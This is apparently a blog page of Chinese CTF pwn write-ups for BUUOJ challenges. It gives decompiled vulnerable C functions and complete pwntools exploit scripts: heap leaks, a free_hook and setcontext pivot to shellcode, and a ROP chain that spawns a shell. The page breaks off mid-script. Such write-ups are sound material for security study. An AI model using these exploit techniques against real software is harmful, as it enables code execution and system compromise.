<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./ycb_2020_easy_heap'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">29210</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'Choice:'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Size: '</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">'malloc_hook = '</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.30.so'</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">li(<span class="string">'free_hook = '</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">0x6c0</span></span><br><span class="line">li(<span class="string">'heap_base = '</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x6c0</span>) + <span class="number">0x18</span> * <span class="string">b'a'</span> + p64(<span class="number">0x50</span>))</span><br><span class="line">edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(heap_base + <span class="number">0x6f0</span> - <span class="number">0x18</span>) + p64(heap_base + <span class="number">0x6f0</span> - <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x31</span>) + p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x0000000000154b90</span> + libc_base</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, p64(gadget))</span><br><span class="line"></span><br><span class="line">heap_first = heap_base + <span class="number">0x290</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">setcontext = libc.sym[<span class="string">'setcontext'</span>] + <span class="number">61</span> + libc_base</span><br><span class="line">mprotect_addr = libc.sym[<span class="string">'mprotect'</span>] + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">'./flag'</span>, <span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, heap_first + <span class="number">0x200</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, heap_first + <span class="number">0x200</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">p1 = p64(heap_first + <span class="number">0x100</span>) + p64(heap_first)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x20</span>, <span class="string">b'\x00'</span>) + p64(setcontext)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x68</span>, <span class="string">b'\x00'</span>) + p64(heap_base)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x70</span>, <span class="string">b'\x00'</span>) + p64(<span class="number">0x4000</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x88</span>, <span class="string">b'\x00'</span>) + p64(<span class="number">7</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0xa0</span>, <span class="string">b'\x00'</span>) + p64(heap_first)</span><br><span class="line">p1 = p1.ljust(<span class="number">0xa8</span>, <span class="string">b'\x00'</span>) + p64(mprotect_addr)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x100</span>, <span class="string">b'\x00'</span>) + shellcode</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p1)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="hxb-pwn300"><a href="#hxb-pwn300" class="headerlink" title="hxb_pwn300"></a>hxb_pwn300</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+18h] [ebp-38h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> times; <span class="comment">// [esp+44h] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> *ptr; <span class="comment">// [esp+48h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [esp+4Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  times = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  Welcome();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"How many times do you want to calculate:"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;times);</span><br><span class="line">  <span class="keyword">if</span> ( times &lt;= <span class="number">3</span> || times &gt; <span class="number">255</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wrong input!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  }</span><br><span class="line">  ptr = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span> * times);</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( index &lt; times )</span><br><span class="line">  {</span><br><span class="line">    PrintMenu();</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Add();</span><br><span class="line">        ptr[index] = ResultAdd;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Sub();</span><br><span class="line">        ptr[index] = ResultSub;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        Mul();</span><br><span class="line">        ptr[index] = ResultMul;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        Div();</span><br><span class="line">        ptr[index] = ResultDiv;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;v5, ptr, <span class="number">4</span> * times);</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"wrong input!"</span>);</span><br><span class="line">LABEL_11:</span><br><span class="line">        ++index;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>第5个功能存在溢出，借助add这个函数可以控制返回地址，所以times改大，又因为这题是静态编译，所以直接–ropchain，然后修一下，修成直接发送地址的格式即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./pwn300'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26836</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'How many times do you want to calculate:'</span>, <span class="string">'200'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">addr</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">'5 Save the result\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'input the integer x:'</span>, <span class="string">'0'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'input the integer y:'</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">add(<span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">add(<span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">add(<span class="number">0x080bb406</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">add(<span class="number">0x6e69622f</span>)</span><br><span class="line">add(<span class="number">0x080a1dad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">add(<span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">add(<span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">add(<span class="number">0x080bb406</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">add(<span class="number">0x68732f2f</span>)</span><br><span class="line">add(<span class="number">0x080a1dad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">add(<span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">add(<span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">add(<span class="number">0x08054730</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">add(<span class="number">0x080a1dad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">add(<span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">add(<span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">add(<span class="number">0x0806ed31</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">add(<span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">add(<span class="number">0x080ea060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">add(<span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">add(<span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">add(<span class="number">0x08054730</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">add(<span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">add(<span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">add(<span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">add(<span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">add(<span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">add(<span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">add(<span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">add(<span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">add(<span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">add(<span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">add(<span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">add(<span class="number">0x08049781</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'5 Save the result\n'</span>, <span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="ciscn-2019-ne-6"><a href="#ciscn-2019-ne-6" class="headerlink" title="ciscn_2019_ne_6"></a>ciscn_2019_ne_6</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  index = sub_D5D();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">9</span> )</span><br><span class="line">  {</span><br><span class="line">    ptr = (<span class="type">void</span> *)heap_ptr[index].ptr;</span><br><span class="line">    heap_ptr[index].size = <span class="number">0LL</span>;</span><br><span class="line">    heap_ptr[index].ptr = <span class="number">0LL</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里出现了一个ptr未初始化的漏洞，因为当index不在上面那个if范围的时候就会直接free</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_F0D</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"passwd:"</span>);</span><br><span class="line">  sub_DEA(s, <span class="number">0x28</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s, password, <span class="number">0x28</span>uLL) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"I will tell you magic's address: %p\n"</span>, password);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No No No you are not root."</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>最关键的是delete上面一个函数可以去改ptr这个指针，也就是利用F0D这个函数去写ptr指针，再利用delete函数去释放这个指针，这样就可以达到double free效果</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./ciscn_2019_ne_6'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span 